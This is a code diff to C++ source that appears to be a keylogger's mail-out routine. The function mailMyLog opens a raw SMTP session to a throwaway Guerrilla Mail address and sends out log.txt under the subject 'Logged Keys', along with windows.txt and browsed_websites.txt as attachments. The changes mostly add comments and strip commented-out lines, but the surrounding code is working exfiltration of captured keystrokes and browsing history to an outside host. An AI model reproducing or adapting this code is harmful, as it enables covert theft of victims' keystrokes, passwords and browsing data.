@@ -15,6 +15,7 @@ using namespace std;
 #define recipientAddr "mdsiam01@sharklasers.com"
 #define SMTPLog "smtp.log"
 
+
 int sendData(SOCKET* socket, const char* data)
 {
     int iResult;
@@ -101,6 +102,8 @@ int mailMyLog(char *receiverAddress) {
         return 1;
     }
 
+    //applyting smtp protocol for mail sending
+
     sendData(&ConnectSocket, "HELO mail.sharklasers.com\r\n");
     recvData(&ConnectSocket);
     Sleep(1000);
@@ -117,12 +120,18 @@ int mailMyLog(char *receiverAddress) {
     sendData(&ConnectSocket, "Subject:Logged Keys\r\n");
     sendData(&ConnectSocket, "And this is text\r\n");
     sendData(&ConnectSocket, "MIME-Version: 1.0\r\n");
+
+    //an arbitrary hash value for defining the boundary of the email, as it contains attachments
+
     sendData(&ConnectSocket, "Content-Type:multipart/mixed;boundary=\"977d81ff9d852ab2a0cad646f8058349\"\r\n");
     sendData(&ConnectSocket, "Subject:Logged Keys\r\n");
-    sendData(&ConnectSocket, "\r\n"); /* added */
+    sendData(&ConnectSocket, "\r\n");
     sendData(&ConnectSocket, "--977d81ff9d852ab2a0cad646f8058349\r\n");
     sendData(&ConnectSocket, "Content-Type: text/plain; charset=\"utf-8\"\r\n");
     sendData(&ConnectSocket, "Content-Transfer-Encoding: quoted-printable\r\n\r\n");
+
+    //send the data of log.txt as plain text
+
     FILE *fp = fopen("log.txt", "r");
     char mylogs[10000];
     char tem[100];
@@ -134,21 +143,16 @@ int mailMyLog(char *receiverAddress) {
         tem[size1-1]='\n';
         tem[size1]='\0';
         sendData(&ConnectSocket, tem);
-        //tem[size1-1]='\n';
-
-        //std::cout<< tem <<std::endl;
         strcat(mylogs, tem);
     }
     sendData(&ConnectSocket,"=0A=0ARegards,=0A<SIAM>=0A=0A\r\n\r\n");
-    //sendData(&ConnectSocket, mylogs);
-    //sendData(&ConnectSocket, "\r\n\r\n977d81ff9d852ab2a0cad646f8058349--\r\n\r\n");
-    //sendData(&ConnectSocket, "Hi Siam,=0A=0AThis is an empty file.=0A=0ARegards,=0A<ME>=0A=0A---- =0ASent using Guerrillamail.com =0ABlock or report abuse : https://www.guerrillamail.com//abuse/?a=3DUVJzDA8SW6Q1mwa14nUTcwfCX9ne0dhd=0A \r\n\r\n");
     sendData(&ConnectSocket, "--977d81ff9d852ab2a0cad646f8058349\r\n");
     sendData(&ConnectSocket, "Content-Type: text/plain\r\n");
-    //sendData(&ConnectSocket, "Content-Transfer-Encoding: base64\r\n");
+
+    //send the windows.txt as txt file
+
     sendData(&ConnectSocket, "Content-Disposition: attachment; filename=\"windows.txt\"\r\n\r\n");
     sendData(&ConnectSocket, "U2FtcGxlIFRleHQu");
-    //sendData(&ConnectSocket, "\r\n\r\n--977d81ff9d852ab2a0cad646f8058349--\r\n\r\n");
     sendData(&ConnectSocket, ".\r\n");
 
     FILE* MailFilePtr = fopen("windows.txt", "r");
@@ -164,10 +168,7 @@ int mailMyLog(char *receiverAddress) {
         sprintf(buf, "%s", FileBuffer);
         buf[strlen(buf) - 1] = 0;
         strcat(buf,"\n");
-        //strcat(buf, FileBuffer);
-       // strcat(buf,".\r\n");
         sendData(&ConnectSocket, buf);
-        //recvData(&ConnectSocket);
         memset(FileBuffer, 0, sizeof(FileBuffer));
         memset(buf, 0, sizeof(buf));
     }
@@ -176,11 +177,11 @@ int mailMyLog(char *receiverAddress) {
 
     sendData(&ConnectSocket, "--977d81ff9d852ab2a0cad646f8058349\r\n");
     sendData(&ConnectSocket, "Content-Type: text/plain\r\n");
-    //sendData(&ConnectSocket, "Content-Transfer-Encoding: base64\r\n");
     sendData(&ConnectSocket, "Content-Disposition: attachment; filename=\"browsed_websites.txt\"\r\n\r\n");
     sendData(&ConnectSocket, "U2FtcGxlIFRleHQu");
-    //sendData(&ConnectSocket, "\r\n\r\n--977d81ff9d852ab2a0cad646f8058349--\r\n\r\n");
     sendData(&ConnectSocket, ".\r\n");
+
+    //send the browsed_website.txt as txt file
 
     MailFilePtr = fopen("browsed_websites.txt", "r");
     if (MailFilePtr == NULL)
@@ -195,18 +196,13 @@ int mailMyLog(char *receiverAddress) {
         sprintf(buf, "%s", FileBuffer);
         buf[strlen(buf) - 1] = 0;
         strcat(buf,"\n");
-        //strcat(buf, FileBuffer);
-       // strcat(buf,".\r\n");
         sendData(&ConnectSocket, buf);
-        //recvData(&ConnectSocket);
         memset(FileBuffer, 0, sizeof(FileBuffer));
         memset(buf, 0, sizeof(buf));
     }
 
     fclose(MailFilePtr);
     sendData(&ConnectSocket, "\r\n\r\n--977d81ff9d852ab2a0cad646f8058349--\r\n\r\n");
-    //sendData(&ConnectSocket, buf);
-    //sendData(&ConnectSocket, "\r\n\r\n--KkK170891tpbkKk__FV_KKKkkkjjwq--\r\n\r\n");
     sendData(&ConnectSocket, ".\r\n");
     recvData(&ConnectSocket);
 
